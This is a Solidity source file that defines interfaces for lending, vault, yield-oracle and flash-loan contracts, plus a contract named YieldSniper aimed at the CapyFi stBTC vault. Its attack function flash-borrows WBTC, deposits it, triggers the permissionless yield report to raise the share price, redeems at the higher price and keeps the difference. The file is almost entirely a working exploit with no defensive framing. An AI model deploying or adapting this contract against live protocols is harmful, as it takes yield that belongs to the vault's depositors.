// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
}

interface ICToken is IERC20 {
    function mint(uint256) external returns (uint256);
    function redeem(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
    function borrow(uint256) external returns (uint256);
    function repayBorrow(uint256) external returns (uint256);
    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral) external returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function exchangeRateCurrent() external returns (uint256);
    function getCash() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalBorrows() external view returns (uint256);
    function balanceOfUnderlying(address) external returns (uint256);
    function underlying() external view returns (address);
    function comptroller() external view returns (address);
    function borrowBalanceStored(address) external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface IComptroller {
    function getAccountLiquidity(address) external view returns (uint256, uint256, uint256);
    function markets(address) external view returns (bool, uint256, bool);
    function getAssetsIn(address) external view returns (address[] memory);
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
    function oracle() external view returns (address);
    function closeFactorMantissa() external view returns (uint256);
    function liquidationIncentiveMantissa() external view returns (uint256);
    function mintGuardianPaused(address) external view returns (bool);
    function borrowGuardianPaused(address) external view returns (bool);
}

interface IPriceOracle {
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

interface IStBTC is IERC20 {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function mint(uint256 shares, address receiver) external returns (uint256 assets);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function totalAssets() external view returns (uint256);
    function previewDeposit(uint256 assets) external view returns (uint256);
    function previewRedeem(uint256 shares) external view returns (uint256);
    function whitelistEnabled() external view returns (bool);
    function vault() external view returns (address);
}

interface IYieldOracle {
    function reportYield(address strategy) external returns (uint256);
    function getPendingYield(address strategy) external view returns (uint256);
    function strategyApyBps(address strategy) external view returns (uint256);
    function lastReportAt(address strategy) external view returns (uint256);
    function minReportInterval() external view returns (uint256);
    function vault() external view returns (address);
}

interface IOffchainVault {
    function availableBalance() external view returns (uint256);
    function offchainBalance() external view returns (uint256);
    function totalManagedAssets() external view returns (uint256);
    function strategyPrincipal(address) external view returns (uint256);
    function isStrategyAllowed(address) external view returns (bool);
    function minLiquidityBps() external view returns (uint256);
}

interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IMorphoFlashLoanCallback {
    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external;
}

/// @notice Atomic zero-fee flash-loan yield sniper for the CapyFi stBTC vault.
contract YieldSniper is IMorphoFlashLoanCallback {
    IERC20 public immutable wbtc;
    IStBTC public immutable stbtc;
    IYieldOracle public immutable oracle;
    address public immutable strategy;
    address public immutable morpho;
    uint256 public profit;

    constructor(address _wbtc, address _stbtc, address _oracle, address _strategy, address _morpho) {
        wbtc = IERC20(_wbtc);
        stbtc = IStBTC(_stbtc);
        oracle = IYieldOracle(_oracle);
        strategy = _strategy;
        morpho = _morpho;
    }

    function attack(uint256 amount) external {
        IMorpho(morpho).flashLoan(address(wbtc), amount, abi.encode(amount));
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external override {
        require(msg.sender == morpho, "only morpho");
        uint256 balBefore = wbtc.balanceOf(address(this)); // == assets
        // 1. deposit into stBTC at pre-report share price
        wbtc.approve(address(stbtc), assets);
        uint256 shares = stbtc.deposit(assets, address(this));
        // 2. trigger the permissionless yield report -> share price jumps
        oracle.reportYield(strategy);
        // 3. redeem at the post-report price
        uint256 got = stbtc.redeem(shares, address(this), address(this));
        require(got >= assets, "no yield captured");
        // 4. approve Morpho to pull the flash loan back (zero fee)
        wbtc.approve(morpho, assets);
        profit = got - assets; // captured yield
    }
}
